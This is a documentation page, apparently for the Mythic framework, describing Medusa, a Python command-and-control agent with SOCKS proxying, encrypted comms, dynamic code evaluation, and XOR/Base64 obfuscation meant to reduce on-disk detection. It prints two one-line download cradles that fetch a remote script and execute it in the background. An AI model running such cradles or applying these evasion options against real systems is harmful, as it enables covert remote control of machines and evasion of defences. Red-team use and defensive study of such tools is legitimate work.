+++
title = "Medusa"
chapter = false
weight = 5
+++

![logo](/agents/medusa/medusa.svg?width=200px)
## Summary

Medusa is a cross-platform Python agent compatible with Python 2.7 and 3.8.

### Highlighted Agent Features

Python is an incredibly popular programming language and is often installed by default on many operating systems. Python 2.7, for example, is currently available on the latest macOS installs (though expected to be discontinued).
Default libraries, such as `Cocoa` and `ctypes`, allow access to Objective-C APIs and functionality through Windows DLLs.

The Medusa agent itself has several key features including:
- Support for dynamic loading/unloading of functionality to limit exposure of agent capabilities on-disk. 
- A SOCKS5 proxy compatible across Python 2.7 and 3.8, and across macOS, Windows and Linux.
- Encrypted comms.
- `Eval()` of Python code to dynamically extend functionality.

With the ability to execute arbitrary script on the command-line, a rudementary download cradle can be used, such as the below (notably, not proxy-aware):
```
python3 -c "import urllib.request; exec(urllib.request.urlopen('https://[REMOTE_HOST]/medusa.py').read())" &
```

Or for Python 2.7:
```
python -c "import urllib2;exec(urllib2.urlopen('https://[REMOTE_HOST]/medusa.py').read())" &
```

### Build Options

This section provides details of what each Medusa-specific build option provides

#### Python Version

Pretty self-explanatory, select which version of Python the Medusa agent should be created for. See the Development section for details of how this works under the hood.

#### Output Format

Mythic can provide the final agent code as a Python script, or as a Base64-encoded blob. Note that this is the last stage of the process effectively. So any XOR obfuscation, crypto library selection or Python version selection will take place before this.

#### Cryptography library

Medusa agents can be built using either a manual crypto implementation or using the non-default `cryptography` library. Given, the manual implementation isn't going to be as quick or efficient as the main Python library (not to mention the extra code required), `cryptography` use might be the way to go. Though do bear in mind, it is not a default library and appears to only be installed on macOS by default.

{{% notice info %}}
 Either option here won't affect the agents ability to use encrypted comms, it is purely to specify how the encrypted comms are achieved.
{{% /notice %}}

#### XOR and Base64-encode

Finally, the plaintext Medusa script can be encrypted via XOR with a randomly-generated key, before being Base64 encoded. This blob is then wrapped with an unpacker and put in a `exec()` function to ultimately run the Medusa agent. This is designed to make the agent less signaturable when on-disk. See the OPSEC section for more details.

#### Verify HTTPS Certificate

By default, the web request libraries used in Medusa will fail when handling a self-signed certificate for HTTPS. This function introduces code to skip cert verification, so C2 can be established.


### Important Notes
Each job is executed in a new thread. Long-running jobs can be viewed with the `jobs` command and, where a 'stop' functionality has been implemented, they can be killed with `jobkill`.

## Authors
@ajpc500


